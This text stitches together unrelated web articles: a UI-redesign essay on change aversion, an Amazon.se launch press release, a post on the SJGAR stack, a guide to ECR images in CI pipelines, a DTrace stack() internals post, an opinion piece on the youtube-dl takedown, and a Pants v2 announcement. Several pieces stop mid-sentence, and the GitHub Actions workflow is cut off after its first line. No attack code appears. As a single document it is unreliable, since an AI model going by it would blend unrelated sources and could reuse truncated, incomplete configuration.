<p><span>When introducing changes in this aspect of your product, both psychology and history say you should take it slow.</span></p>
<h2><strong>What Psychology Tells Us&nbsp;</strong></h2>
<p>To discuss why sudden and major UI changes backfire from a psychological point of view, we have to address change aversion.&nbsp;</p>
<p>There have been many cases where consumers refused to adapt to a new product, even if it was objectively “better”. One good example would be the introduction of the <a href="https://www.dvorak-keyboard.com/"><span>Dvorak keyboard</span></a> in the 1930s.</p>
<p>Even&nbsp;though the Dvorak keyboard promoted objectively better physical ergonomics, people refused to move from the QWERTY keyboard <span>—</span> simply because they were used to it.&nbsp;</p>
<p>Why is that?</p>
<h3><strong>Users Want to Feel Smart</strong></h3>
<p>It’s widely taught by UIUX experts like Rohan Puri and Robert Youmans, that users are aversive to change because “change makes them feel dumb”. When using your product, users want to feel in control, like they know what they’re doing.&nbsp;</p>
<p>Especially for neurodivergent users, big and sudden changes in UI can be disorienting. When you change things around all at once, you’re also making your users relearn what they’d previously mastered before <span>— and that takes time and energy. In other words, you’re giving them work to do.</span></p>
<p>If you’re an app or web developer, always remember that your users aren’t sitting next to you, watching you iterate and develop from scratch. Your interface may seem simple to you because you’ve familiarized with it as you worked on it, but that’s not the case for them.</p>
<h3><strong>Value is Invisible</strong></h3>
<p>Confirming many real-life cases, a study by Rosman et al on <a href="https://www.researchgate.net/publication/262411663_On_user_behaviour_adaptation_under_interface_change"><span>user behaviour adaptation under interface change</span></a> found that it takes many tries for a user to feel comfortable enough with an interface that was initially unfamiliar to them, before they “conﬁdently choose it and realise the potential beneﬁts”.</p>
<p>Because the bulk of your revamp’s value is neither visible nor instantly detectable, more impatient users might poorly estimate the efﬁciency of your improved UI and “prematurely abandon it” in that particular time frame.</p>
<p>After all, if they don’t see an increase in value, why would they like that you changed what was already working for them?</p>
<h2><strong>What History Tells Us</strong></h2>
<p>Negative feedback from a large number of users can spread like wildfire on social media. Needless to say, that can be really detrimental to your brand and product.</p>
<p>If you’re a startup just starting out with a small user base, you have more leeway for major UI redesigns while you figure out your brand and voice. As your product grows, however, so does the need to prioritize your users’ preferences.&nbsp;</p>
<p>Some companies with really big user bases learned the hard way so we don’t have to.&nbsp;</p>
<h3><strong>What Happened with Digg</strong></h3>
<p>In 2010, Digg, a news aggregate site very much like reddit, launched a redesign that caused them to lose 35% of their users nearly instantly.</p>
<p>In the Digg v4 update, the site was heavily revamped visually and functionally. Among many of the sudden changes, the downvote button was removed, users could no longer save posts to favorites or posts videos,&nbsp; their Upcoming page was gone, and the overall focus was shifted from user-submitted content to publisher-submitted content.&nbsp;</p>
<p>This major change didn’t just disorient their users. It took control away from them. With the new system, posts by publishers and sponsors flooded the front page, while posts by regular users were practically invisible.&nbsp;</p>
<p>The result of this? A mass exodus. Users either flooded the site with protest links (many of which were links to Reddit, their biggest competitor) or immediately migrated to Reddit.&nbsp;</p>
<h3><strong>What Happened with eBay</strong></h3>
<p>Once, eBay decided to change the background color of many of their site’s pages from bright yellow to white. Even though this change may seem like an obvious aesthetic choice today, it caused a ruckus on the internet (and in the team’s mailbox) when it first happened, forcing them to revert to yellow.</p>
<p>eBay didn’t give up on their vision, though. They came up with a strategy to go subtle, and designed an algorithm that faded the background from yellow to white, one shade at a time, over a few months. This time, the internet was still. The change was taking place so gradually that their users didn’t notice it was happening.</p>
<h2><strong>How Do You Safely Revamp?</strong></h2>
<p>Now that storytime is over, let’s talk about what we can learn from them. How can you revamp your product while being wary of change aversion?&nbsp;</p>
<p>Obviously, getting complaints from users doesn’t mean you should stop updating your app or website. <span>M</span>aintenance is necessary for your product to thrive and continue thriving.<span> The secret lies in </span><em><span>how</span></em><span> you execute it.</span></p>
<h3><strong>Change Little and Often</strong></h3>
<p>Instead of giving your users a whole new interface to relearn at one go, introduce a little change at a time. Habits take time to unlearn. Giving users one small redirection at a time is a lot less disorienting and burdensome for them.</p>
<h3><strong>Give Users a Heads-up&nbsp;</strong></h3>
<p>Before you launch your redesign, give users time to prepare for it. This will dampen the impact of the launch and reduce the risk of shocking them into frustration with your product.&nbsp;</p>
<h3><strong>Spell Out the Values</strong></h3>
<p>As mentioned before, values are invisible. Users don’t always immediately see the benefits of your new interface when they first try it. Instead of waiting for them to figure the maze out on their own, give them the lowdown on how the changes you’ve implemented are designed to solve the problems they face.</p>
<h3><strong>Provide Guidance</strong></h3>
<p>Part of spelling out the values of your redesign is by easing your users’ transition to your new interface. When you provide tutorials and demonstratives, you’re also teaching them how the new design improves their experience on your app or website.</p>
<h3><strong>Provide Options</strong></h3>
<p>It’s always good to give your users the option to switch back to the old interface. Provide them a toggle switch or button to revert to the old version, and place it somewhere easily accessible.</p>
<h3><strong>Welcome Feedback</strong></h3>
<p>Give your users an outlet or channel through which they can directly communicate with your team. Whether it’s a form on your website, or simply an email address they can write to specifically for complaints and feedback, it’s always good to let your users know that you’re listening.</p>

        <div><p><b>Stockholm - October 28, 2020</b> – Starting today, customers across Sweden can visit Amazon.se to shop from a selection of over 150m products, with the benefit of everyday low prices and reliable free delivery for eligible orders above SEK 229. Amazon.se features a vast selection of products across more than 30 categories, such as Books, Consumer Electronics, Sports and Outdoor, Tools and Home Improvement, Toys and Baby, including products from thousands of European and local Swedish businesses.</p><p>“We are thrilled to launch Amazon.se and to be able to offer Swedish customers a selection of more than 150 million products, including tens of thousands of products from local Swedish businesses,” said Alex Ootes, Vice President, European Expansion for Amazon. “Today is only the start of Amazon.se. We will continue to work hard to earn the trust of Swedish customers by growing our product range, ensuring low prices, and providing a convenient and trusted shopping experience.”</p><p>Swedish customers can conveniently shop from anywhere, any time with no-hassle returns and Swedish customer service through the Amazon Shopping app and desktop and mobile browsers. All customers shopping on Amazon.se enjoy free delivery for millions of items on eligible orders over SEK 229. Customers can easily browse the growing selection, read customer reviews, view personalized recommendations, create wish lists and track their orders.</p><p>Amazon is offering a wide variety of products from local Swedish brands, as well as big brand favorites. Customers can find great prices on products offered by Swedish brands like Electrolux, Lagerhaus, OBH Nordica, Ellos, BRIO, Bonnierförlagen and Ifö, as well as international brands like ASUS, Mattel, Hasbro, LEGO and Bosch.</p><p><b><em>Amazon.se offers growth opportunities for Swedish businesses – big and small</em></b><br>With the launch of Amazon.se, it will be easier for Swedish businesses to sell their products on Amazon, reach more customers and expand. Amazon has invested billions of dollars in infrastructure and technical services that help small and medium-sized businesses reach new customers across Sweden and around the world, including simple listing tools that support all seven European Amazon stores, enabling easy expansion within Europe, as well as 24/7 online Selling Partner support, open and transparent selling conditions and pricing, and reports and analytics tools to help them grow. As a result of this investment there are now 1.7 million small and medium-sized businesses around the world selling in Amazon’s stores, with more than 200,000 entrepreneurs worldwide who surpassed $100,000 in sales on Amazon in 2019.</p><p>“Today, thousands of European and local selling partners are offering their products on Amazon.se and on our other Amazon stores across the EU as well as in the US. We are excited for our international customers to experience and enjoy this Swedish selection and help grow these businesses with every purchase they make”, says Alex Ootes. “Small and medium sized companies selling in Amazon stores created an estimate 1.6 million jobs worldwide and we hope to see Swedish companies prosper in the same way.”</p><p>Pierre Magnusson, Head of E-commerce at N!CK’S, the Swedish healthy snack business, said: “The opportunities on Amazon are enormous. Amazon has grown to become our most important channel for exports, and within the first months of working with Amazon we were cash flow positive. N!CK'S continues to grow and has become one of the best-selling brands within our category, and we are still seeing 50% year-on-year growth in the EU Amazon stores alone. I would definitely recommend more Swedish companies start selling on Amazon.”</p><p>Elisabet Sandström, CEO of Miss Mary of Sweden AB, a manufacturer of high quality lingerie, said: “Amazon is an important channel for our expansion in Europe and the US, and we now look forward to selling through the Swedish Store when Amazon opens in our home country. Our sales on Amazon have increased steadily by over 50% per year, and Amazon is our fastest growing channel. Germany is currently Miss Mary’s largest customer base, and when we entered Amazon.de we noticed an immediate sales increase. We now appreciate the opportunity to reach new Swedish customers and make them happy.”</p><p><b><em>Investment in Sweden for a Sustainable Future</em></b><br>The launch of Amazon.se comes weeks after Amazon announced its largest investment in renewable energy outside of the US, with the launch (10/15) of the 91-megawatt Bäckhammar project in Western Sweden. It will support Amazon Web Services (AWS) data centers in the country, as well as the expanding Amazon retail business, and is expected to deliver 280,000-megawatt hours of clean energy annually into the Swedish grid - the equivalent of powering 29,000 average homes in Sweden. The Bäckhammar project is<em> </em>the first of two Amazon renewable energy projects to come online in Sweden. The second, a 122-megawatt onshore windfarm in Västernorrland, currently in construction, is expected to commence operations in 2022. In total, these projects will add 213 megawatts of new clean energy to the Swedish grid.</p><p>These launches takes Amazon one step closer to meeting its <span><span><a href="https://sustainability.aboutamazon.com/about/the-climate-pledge#section-nav-id-1" target="_blank" data-cms-ai="0">Climate Pledge commitments</a></span></span> of achieving net zero carbon emissions by 2040, ten years ahead of the Paris Agreement. This will be achieved through powering its operations with 100% renewable energy by 2025, making all Amazon shipments net zero carbon through Shipment Zero, with 50% of all shipments net zero carbon by 2030; ordering over 100,000 electric delivery vehicles; and investing $2 billion to support the development of technologies and services that reduce carbon emissions and help preserve the natural world.</p><p><b><em>About Amazon</em></b><br>Amazon is guided by four principles: customer obsession rather than competitor focus, passion for invention, commitment to operational excellence, and long-term thinking. Customer reviews, 1-Click shopping, personalized recommendations, Prime, Fulfillment by Amazon, AWS, Kindle Direct Publishing, Kindle, Fire tablets, Fire TV, Amazon Echo, and Alexa are some of the products and services pioneered by Amazon.

<p><strong>In this article I will introduce you to a new software stack that can be thought of as a spiritual successor to the MEAN or MERN stack. The technologies in the SJGAR stack were carefully combined to create something where the whole is greater than the sum of its parts. Focus on your customers, on business value and the developer experience. Do more, and keep things simple.</strong></p>
<p><strong>If you want to find out why the mix of Serverless, JavaScript, GraphQL, AWS and React could be interesting to you please read on.</strong></p>

<p>I remember writing software in the period roughly between 2005 and 2015 where sometimes it could feel like every week something new was thrown at us. We were transitioning from desktop to the web and then cloud and mobile. We were just getting good at Object-oriented programming when a shift towards Functional Programming required us to rethink our mental models around our code. Cloud scale computing brought us from solely using SQL databases to study and use NoSQL databases. We went from embracing XML and SOAP to transitioning to JSON.</p>
<div><p><h3>Focus on your customers, on business value and the developer experience. Do more, and keep things simple.</h3></p></div>

<p>Looking at JavaScript alone there was also a lot of turmoil. The language started almost as a toy language to glue together simple elements on a web page. Then it slowly but steadily grew into becoming the most widely used programming language on the web. It even moved on beyond the browser and started to conquer the server with Node.js. A realm where Java and .NET were dominant before, now had to create some room for people starting to use JavaScript on the server.</p>
<p>On the web, framework after framework was becoming popular. Much to the point where they are still being refactored away ten years later. I remember moving from jQuery to Backbone or Knockout. I used Ember a bit and then also Angular. All of these seemed to offer some improvements over what was previously there. There were still enough rough edges however. It was clear we were not there yet.</p>

<p>In 2015, I got the chance to work on a corporate startup project that was completely greenfield. We set out to create a platform with web and mobile apps with state-of-the-art user experience, and we wanted to fail or succeed fast. This meant we had to ensure a short time to market. We had to focus on developer experience and productivity. After having tried some pieces of technology on smaller projects, this was the perfect chance to put them together and figure out if they would play nicely together. In theory, it should all work, but previous experience had shown that you really need to start using them for a decent amount of time to figure out if the new advantages will really outweigh the drawbacks.</p>
<div><p><h3>It worked. It really worked.</h3></p></div>
<p>We built a web application using React and an accompanying mobile app using React Native. The backend was built using AWS Serverless technologies. We used DynamoDB as the single source of truth for data. The built-in event triggering system was used to run some Node.js code in a Lambda to stream this data to a managed Elasticsearch cluster, so we could support the search and query capabilities we needed. We created a GraphQL API using the reference server implementation graphql-js (Apollo Server and Client weren't a thing back then). Again this was run in Lambda. To make sure the web application was performant enough for our end users we used a Lambda to implement Server Side Rendering (Gatsby and Next.js also weren't a thing back then). We also used the Serverless framework, a bit shaky at that time, to write our infra as code.</p>
<p>With a handful of full stack engineers we were able to deliver this project successfully to production. We could deliver new versions of our microservices independently, and we would do this multiple times a day.</p>
<p>It worked. It really worked.</p>
<p>We started with almost zero costs for infrastructure. The most expensive service was the Elasticsearch service. The other services would easily service our first customers on the free tier. I think we never spent over 100 euros a month. Without Elasticsearch it would probably not have been higher than 10 euros a month. We launched and started running ad campaigns to lure customers to our new offering. For these ad campaigns we were spending over a thousand euros per month. It was clear that we now could go to the business and tell them we could do innovation projects with IT running costs of close to zero.</p>
<p>I remember we were able to move some logic from the web app to the authentication provider (we used Auth0 back then since Cognito was still a bit too new) by just copying some JavaScript code. Similarly, we were able to move code from frontend to backend. More generally we were able to take what we learned in a certain context, and apply it to a different one. JavaScript allowed us to learn a single programming language and write code for the Web, Mobile and Cloud. React allowed us to use a single framework to structure applications and do the state management for both Web and Mobile. Using Flexbox we could even apply the same UI layout system in these apps. With the complex and time-consuming nature of layout work, it was great that we were able to reuse our knowledge and tools to enjoy a great productivity boost.</p>
<p>Going Serverless meant we did not have to spend time on managing servers. The code and the system would just work. No disks filling up, no security patches to be applied, no certificates to be updated. AWS had given us a platform with great performance and stability. Everything would just run.</p>
<p>After running this project in 2015 and 2016, in the end it was shuttered because it did not align with our business goals. Only later I came to realize this set of technologies would stand the test of time, and would do so pretty well.</p>
<div id="okay-this-thing-needs-a-name"><h3><a href="#okay-this-thing-needs-a-name" target="_blank" rel="noopener noreferrer" aria-label="okay this thing needs a name permalink"></a>Okay. This Thing Needs A Name.</h3></div>
<p>Fast-forward a bit to when I joined my current team and company early 2019. We formed a new innovation department and dreamed of a future where we helped turn our 175-year-old financial company into a fintech. Teaming up with the department that was our business counterpart, in the first year we built and delivered a total of fourteen projects with a relatively common two pizza team. In the previous nineteen years of my career I had never witnessed anything like this. We built smaller projects like landing pages, but also large ones like a new platform to sell houses using data and AI. We also built a fairly complex API to serve as the backend for an IoT driven car insurance. We even managed to surprise ourselves and win a hackathon in our first year with a mobile app for planting trees.</p>
<div><p><h3>Five years after having first used this set of technologies it was clear that they still were around. Not only were they still around, they had become even stronger with a bigger community supporting them.</h3></p></div>
<p>Many things fell into place to make this a success. For one, it were the amazing people we joined. I consider myself lucky to this day that we met them and were able to make all of these things happen. It was almost as if we started in a performing phase as a team, skipping the forming, norming and storming phases altogether.</p>
<p>Besides the people the technology played an important role here. Five years after having first used this set of technologies it was clear that they still were around. Not only were they still around, they had become even stronger with a bigger community supporting them.</p>
<p>What was really cool was that we were able to deliver all these different types of applications using basically the same architecture. For the IoT insurance, the API we delivered we implemented a lightweight event sourced system using mainly DynamoDB and Lambda. We later added a future event system where we combined DynamoTTL and Step Functions to combine high and low resolution timers, all of which were inspired by a set of blog posts and a tweet we found on the web.</p>
<p>For the housing platform we combined Cognito, Azure AD, DynamoDB, Lambda, AppSync, S3 and CloudFront to deliver a platform that was highly performant. Gatsby helped us leverage React’s power to build statically rendered, SEO-friendly pages, hosted on S3 and made available to the wide internet using CloudFront and Route53. On the backend we created a GraphQL API to, on the one hand, power the build-time data requirements. On the other hand it also powered the real-time admin panel we needed for providing customers support.</p>
<p>There were many more projects that used very similar architectures. Five years after first having used these technologies we were still able to use them to build modern applications. In our hiring process I remember seeing the smiles on the faces of the engineers when we would mention our tech stack.</p>
<div><p><h3>Which parts are going to be successful for at least the next five years?</h3></p></div>
<p>There was this one thing I noticed though. Whenever I wanted to explain our technology stack, I was summing up this combination of technologies one by one. Time after time saying things like “Our stack is JavaScript based, uses the React ecosystem and runs on AWS Serverless... And oh yeah we use GraphQL as a BFF for our apps.” A couple of days later I would say something like “We build apps using React and use JavaScript/TypeScript. Our APIs are running on AWS Lambda using NodeJS.”. And then many more variations of these sentences.</p>
<p>Okay. This thing needs a name.</p>
<p>Back in the days we had the LAMP stack, and some time after that there was the MEAN stack.

        <h2 id="moving-from-docker-hub-to-ecr">Moving from Docker Hub to ECR</h2>

<p><a href="https://pubstack.io/">Pubstack</a>, my current client decided to migrate all its docker images to <a href="https://aws.amazon.com/ecr/">ECR</a>.</p>

<p>With the recent <a href="https://www.docker.com/pricing/resource-consumption-updates">announcement</a> about rate limiting on Docker Hub, maybe we will not be the only ones moving away.</p>

<p>For our <strong>CI/CD</strong> pipelines we use both <a href="https://circleci.com/">CircleCI</a> and <a href="https://github.com/features/actions">GitHub Actions</a>.</p>

<p>Using an <strong>ECR</strong> image is a really simple task in <strong>CircleCI</strong>, it consists of adding the <code>aws_auth</code> to the image configuration.</p>

<div><div><pre><code>  <span>docker</span><span>:</span>
    <span>-</span> <span>image</span><span>:</span> <span>ACCOUNT.dkr.ecr.REGION.amazonaws.com/IMAGE:VERSION</span>
      <span>aws_auth</span><span>:</span>
        <span>aws_access_key_id</span><span>:</span> <span>$AWS_ACCESS_KEY_ID</span>
        <span>aws_secret_access_key</span><span>:</span> <span>$AWS_SECRET_ACCESS_KEY</span>
</code></pre></div></div>

<p>On the other hand, using <strong>ECR</strong> images in <strong>GitHub Actions</strong> was a bit more tricky.</p>

<p>The problem is, you could only use images from private registries in job and service containers since <a href="https://github.blog/changelog/2020-09-24-github-actions-private-registry-support-for-job-and-service-containers/">late september</a>, and they only did the “credentials” implementation.
It means something like this is expected:</p>

<div><div><pre><code><span>jobs</span><span>:</span>
  <span>test</span><span>:</span>
    <span>runs-on</span><span>:</span> <span>ubuntu-latest</span>
    <span>container</span><span>:</span>
      <span>image</span><span>:</span> <span>ACCOUNT.dkr.ecr.REGION.amazonaws.com/IMAGE:VERSION</span>
      <span>credentials</span><span>:</span>
        <span>username</span><span>:</span> <span>AWS</span>
        <span>password</span><span>:</span> <span>${{ secrets.ECR_PASSWORD }}</span>
    <span>steps</span><span>:</span>
      <span>-</span> <span>run</span><span>:</span> <span>echo "inside an ecr container"</span>
</code></pre></div></div>

<p>With aws, you can get a password with <code>aws ecr get-login-password</code>, and it is valid 12 hours.</p>

<p>You can manually set the GitGub secret “ECR_PASSWORD” every 12 hours, but that’s not really convenient.</p>

<p>After a little digging, I found an <a href="https://github.community/t/github-actions-new-pulling-from-private-docker-repositories/16089/28">answer</a> on a GitHub community thread explaining what seems like a good solution.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>Basically what we will do is:</p>

<ol>
  <li>Retrieve <strong>ECR</strong> password from aws</li>
  <li>Store it as a <strong>GitHub</strong> secret name <code>ECR_PASSWORD</code></li>
</ol>

<p>All that inside a <strong>GitHub</strong> action scheduled to run every 6 hours.</p>

<p>It was not really as simple as I first thought, so here is all I had to do.
I hope it can help you.</p>

<p>First, I created some aws credentials (ie. a couple <code>aws_access_key_id</code> and <code>aws_secret_access_key</code> with enough right to pull from ECR)
I put them as secrets inside the <strong>GitHub</strong> project, let’s call them <code>AWS_ACCESS_KEY_ID</code> and <code>AWS_SECRET_ACCESS_KEY</code>.
Then I generated a personal access token (the “provided by default” <code>GITHUB_TOKEN</code> doest not have sufficient rights), let’s call it <code>GH_API_ACCESS_TOKEN</code>.</p>

<p>The complete <strong>GitHub</strong> workflow:</p>

<div><div><pre><code><span>name</span><span>:</span> <span>ecr-login</span>

      <p>Oct 27, 2020</p>

      <p>
	In my <a href="https://zinascii.com/2020/the-amd64-fbt-handler.html">previous
	post</a> I described how FBT intercepts function calls and
	vectors them into the DTrace framework. That laid the
	foundation for what I want to dicuss in this post: the
	implementation of the <code>stack()</code> action and
	built-in <code>arg</code> variables. These features rely on
	the precise layout of the stack, the details of which I
	touched on previously. In this post I hope to illuminate those
	details a bit more with the help of some visuals, and then
	guide you through the implentation of these two DTrace
	features as they relate to the FBT provider.
      </p>

      <h2>A Correction</h2>

      <p>
	But first I must make a correction to my last post. It turns
	out the FBT handler <b>does not</b> execute on the IST stack.
	It runs on either the thread’s stack or the CPU’s high-level
	interrupt stack depending on the context of the kernel
	function call, but never on the IST.
	Rather, <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation">KPTI</a>
	uses the IST stack as a scratch space to perform its
	trampoline into the real handler. This little detail is
	important. Functions like <code>dtrace_getpcstack()</code>
	have zero chance of working if run with the IST stack, for
	reasons which become obvious later. This also explains why the
	AMD64 handler pulls down the stack
	during <code>pushq&nbsp;%RBP</code> emulation: if it’s working
	on the same stack as the thread/interrupt, then it must make
	room for <code>RBP</code>. I can explain better with a visual.
	First, the diagram from the last post.
      </p>

      <figure>
	  
	  <figcaption><a name="fig1-int3-pre-handler">Figure 1. INT3 thread/interrupt state pre-handler</a></figcaption>
      </figure>

      <p>
	On the left we have a kernel thread, interrupt thread, or
	high-level interrupt running on CPU. On the right we have the
	“interrupt context” of the breakpoint exception, using the
	IST. The image is correct in that there are two different
	stacks in play, but what’s running on the right-hand side is
	not the <code>brktrap</code> handler. The right-hand side is
	running the KPTI trampoline, ensuring a CR3 switch when moving
	between the user/kernel boundary. The trampoline also provides
	a facsimile of the processor frame to the interrupted thread’s
	stack, making it none the wiser that KPTI was ever on the
	scene. So all the action happens on the left side, but what
	does the stack look like as we transition through the #BP
	handler on our way to <code>dtrace_invop()</code>?
      </p>

      <figure>
	  
	  <figcaption><a name="fig2-pre-fbt-stack">Figure 2. stack state from #BP to pre dtrace_invop()</a></figcaption>
      </figure>

      <p>
	In phase ① <code>mac_provider_tx()</code> is
	calling <code>mac_ring_tx()</code> while it is under FBT entry
	instrumentation. The last thing on the thread’s stack is the
	return address, and the CPU is about to execute
	the <code>int3</code> instruction.
      </p>

      <p>
	Phase ② is immediately after the CPU has finished execution of
	the <code>int3</code> instruction. The processor (via the
	spectre of the KPTI trampoline) has pushed a 16-byte aligned
	processor frame on the stack and has vectored into
	the <code>brktrap()</code> handler.
      </p>

      <p>
	Phase ③ is after some amount of execution of
	the <code>brktrp()</code> and <code>invoptrap()</code>
	handlers—remember, the #BP handler for DTrace mimics a #UD.
	This last phase shows the state just before the call
	to <code>dtrace_invop()</code>. At this point we’ve grown an
	entire <code>regs</code> structure on the stack and stashed a
	copy of the return address on top of this. The later used to
	populate <code>cpu_dtrace_caller</code>, a variable which
	becomes important later.
      </p>

      <h2>The stack() Action</h2>

      <p>
	The separation of probes and actions is a vital aspect of
	DTrace’s architecture. A firm boundary between these two makes
	DTrace more powerful than it ever could be if they were
	tightly coupled. Think about it, I can ask for the call stack
	in any probe, not just the probes that deem that information
	useful. The probes give you access to a context, and the
	actions give you access to data in that context. To limit the
	execution of actions to specific probes would limit the
	questions you can ask about the system. With this design the
	number of questions you can ask is virtually endless. And it
	turns out one of the more useful questions to ask is: “what
	the hell is running on my CPU”?
      </p>

      <p>
	The <code>stack()</code> action allows you to record the call
	stack that lead to the probe site. In the context of FBT this
	will record the call stack of the kernel thread or interrupt
	executing an entry or return from this kernel function. You
	can also access the userland stack of a thread
	via <code>ustack()</code>, but I don’t cover that here.
      </p>

      <p>
	The <code>stack()</code> action is implemented by
	the <code>dtrace_getpcstack()</code> function. To get there
	from <code>dtrace_invop()</code> requires a couple of more
	calls in the DTrace framework. Ultimately, the call stack to
	get there looks like this.
      </p>

      <figure>
	<div>
	  <pre><code>dtrace_getpcstack()
dtrace_probe()
fbt_invop()
dtrace_invop()

&lt;rest of call stack that lead here&gt;</code></pre>
	</div>
	<figcaption>call stack between dtrace_getpcstack() and dtrace_invop()</figcaption>
      </figure>

      <p>
	The implementation of <code>stack()</code> really starts
	with <code>DTRACEACT_STACK</code> inside
	of <code>dtrace_probe()</code>.
      </p>

      <figure>

      <p>
	The first argument is the address of the array used to store
	program counter values (aka function pointers). This array
	starts at some offset into the current DTrace buffer. The
	second argument if the size of that array. The third argument
	is the number of “artificial frames” on the stack, more on
	this later. The fourth argument is used to determine if the
	first (topmost) program counter in the call stack is the value
	passed in <code>arg0</code> to <code>dtrace_probe()</code>. An
	“anchored” probe is one that has a function name specified
	when calling <code>dtrace_probe_create()</code>. For example,
	the FBT provider uses the name of the kernel function as the
	probe’s function name, thus it is anchored on the kernel
	function. The profile provider, however, specifies no probe
	function name; it is not anchored and is a bit of a special
	case. I address this at the end of the post.
      </p>

      <p>
	This brings us to the <code>dtrace_getpcstack()</code>
	function. But first I’ll expand
	on <a href="#fig2-pre-fbt-stack">figure 2</a> to show our
	stack state as of source line 60 of the function.

	To build the call stack we first need to be able to walk the
	stack. Luckily, illumos keeps frame pointers in the kernel,
	making this easy. But in this particular situation there is
	more to consider. First, we might have two stacks in play: the
	high-level interrupt’s stack as well as the stack of the
	thread it interrupted. Second, the DTrace framework and FBT
	provider have put their own frames between this code and the
	function that tripped this probe; we must exclude these
	“artificial” frames from the result. Finally, we need to make
	sure not to walk off the stack and into space, both for
	correctness and safety. Speaking of the stack,
	the <code>stacktop</code> variable is pointing to the “top” of
	the stack in terms of memory (on x86 stacks grow downwards).
	Logically speaking, <code>stacktop</code> is the bottom of the
	stack and the <code>dtrace_getpcstack()</code> frame is the
	top.

	Make sure to skip over any artificial frames.
	The <code>aframes</code> value is based on information given

	(<code>dtrace_probe_create()</code>/<code>dtpr_aframes</code>)
	as well as knowledge inherent to the DTrace framework. These

October 27, 2020 | https://funnelfiasco.com/blog/2020/10/25/youtube-dl-github-riaa/ | <a href="https://web.archive.org/web/*/https://funnelfiasco.com/blog/2020/10/25/youtube-dl-github-riaa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Earlier this week, <a href="https://www.zdnet.com/article/riaa-blitz-takes-down-18-github-projects-used-for-downloading-youtube-videos/">GitHub took down the repository</a> for the youtube-dl project. This came in response to a request from the RIAA—the recording industry’s lobbying and harassment body. youtube-dl is a tool for downloading videos. The RIAA argued that this violates the anticircumvention protections of the Digital Millennium Copyright Act (DMCA). While GitHub taking down the repository and its forks is true to the principle of minimizing corporate risk, it’s the wrong choice.</p>



<p> Microsoft—currently the world’s second-most valuable company with a market capitalization of $1.64 trillion—owns GitHub. If anyone is in a position to fight back on this, it’s Microsoft. Microsoft’s lawyers should have a one word answer to the RIAA’s request: “no”. <em>(full disclosure: I own a small number of shares of Microsoft)</em></p>



<h2>The procedural argument</h2>



<p>The first reason to tell the RIAA where to stick it is procedural. The RIAA isn’t arguing that youtube-dl is infringing its copyrights or circumventing its protections. It is arguing that youtube-dl infringes YouTube’s protections. So even if it is, that’s YouTube’s problem, not the RIAA’s.</p>



<h2>The factual argument</h2>



<p>I have some sympathy for the anticircumvention argument. I’m not familiar with the specifics of how youtube-dl works, but it’s at least possible that youtube-dl circumvents YouTube’s copy protection. This would be a reasonable basis for YouTube to take action. Again, YouTube, not the RIAA.</p>



<p>I have less sympathy for the infringement argument. youtube-dl doesn’t induce infringement more than a web browser or screen recorder does. There are a variety of uses for youtube-dl that are not infringing. Foremost is the fact that some YouTube videos are under a license that explicitly allows sharing and remixing. Archivers use it to archive content. Some people who have time-variable Internet billing use it to download videos overnight.</p>



<p>So, yes, youtube-dl can be used to infringe the RIAA’s copyrights. It can also be used for non-infringing purposes. The code itself does not infringe. There’s nothing about it that gives the RIAA a justification to take it down.</p>



<h2>youtube-dl isn’t the whole story</h2>



<p>youtube-dl provides a focal point, but there’s more to it. Copyright law is now used to suppress instead of promote creative works. The DMCA, in particular, favors the large rightsholders over smaller developers and creators. It essentially forces sites to act on a “guilty until proven innocent” model. Companies in a position to push back have an obligation to do so. Microsoft has become a supporter of open source, now it’s time to show they mean it.</p>



<p>We should also consider the risks of consolidation. git is a decentralized system. GitHub has essentially centralized it. Sure, many competitors exist, but GitHub has become the default place to host open source code projects. The fact that GitHub’s code is proprietary is immaterial to this point. A FOSS service would pose the same risk if it became the centralized service.</p>



<p>I saw a quote on this discussion (which I can’t find now) that said “code is free, infrastructure is not.” And while projects self-hosting their code repository, issue tracker, etc may be philosophically appealing, that’s not realistic. Software-as-a-Service has lowered the barrier for starting projects, which is a good thing. But it doesn’t come without risk, which we are now seeing.</p>



<p>I don’t know what the right answer is for this. I know the answer won’t be easy. But both this specific case and the general issues they highlight are important for us to think about.</p>

You might use <a href="https://pip.pypa.io/en/stable/">pip</a> to resolve dependencies, <a href="https://docs.pytest.org/en/stable/">pytest</a> to run tests, <a href="https://flake8.pycqa.org/en/latest/">flake8</a> and <a href="https://www.pylint.org/">pylint</a> for lint checks, <a href="https://black.readthedocs.io/en/stable/">black</a> and <a href="https://pycqa.github.io/isort/">isort</a> for auto-formatting, <a href="http://mypy-lang.org/">mypy</a> for type checking, <a href="https://ipython.org/">IPython</a> or <a href="https://jupyter.org/">Jupyter</a> for interactive sessions, <a href="https://setuptools.readthedocs.io/en/latest/">setuptools</a>, <a href="https://pex.readthedocs.io/en/latest/">pex</a> or <a href="https://www.docker.com/">docker</a> for packaging, <a href="https://developers.google.com/protocol-buffers">protocol buffers</a> for code generation, and many more. Not to mention any custom tooling you've built for your repo. </p><p>Installing, configuring and orchestrating the invocation of these tools<strong>—</strong>all while not re-executing work unnecessarily<strong>—</strong>is a hard problem, especially as your codebase grows. The lack of a robust, scalable build system for Python has been a problem for a long time, and this has become even more acute in recent years, with Python codebases increasing in size and complexity. </p><p>Fortunately, there is now a tailor-made (pun intended) solution: <strong>Pants v2</strong>!</p><p><a href="https://www.pantsbuild.org/">Pants v2</a> is designed from the ground-up for fast, consistent builds. Some noteworthy features include:</p><ul><li>Minimal metadata and boilerplate</li><li>Fine-grained workflow</li><li>Shared result caching</li><li>Concurrent execution</li><li>A responsive, scalable UI</li><li>Unified interface for multiple tools and languages</li><li>Extensibility and customizability via a plugin API</li></ul><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/render1603750306032.gif" alt=""><figcaption>Pants running multiple linters in parallel</figcaption></figure><p>Read on to learn more about Pants v2, and what it means for your Python codebase.</p><hr><h2 id="a-little-history">A little history</h2><p>We started the original open-source Pants project back in 2011. At the time, we were frustrated by slow, flaky Scala builds. The leading strategy for scaling was to hand each developer a RAM stick and a screwdriver... Surely this was a problem we could tackle with software! Thus Pants v1 was born. </p><p>Pants v1 was quite successful, and was adopted at cutting-edge tech companies such as Twitter, Foursquare, Square and others. But we still weren't satisfied: The APIs were clunkier than we would have liked, the UI was overly chatty, caching was hard to get right, and concurrent execution had to be special-cased. We knew there were plenty of performance and stability improvements to be had, if we could only unlock them. </p><p>We learned a lot from our years of work on Pants v1, and knew that we could design something new and better, leaning on our experience with v1 while 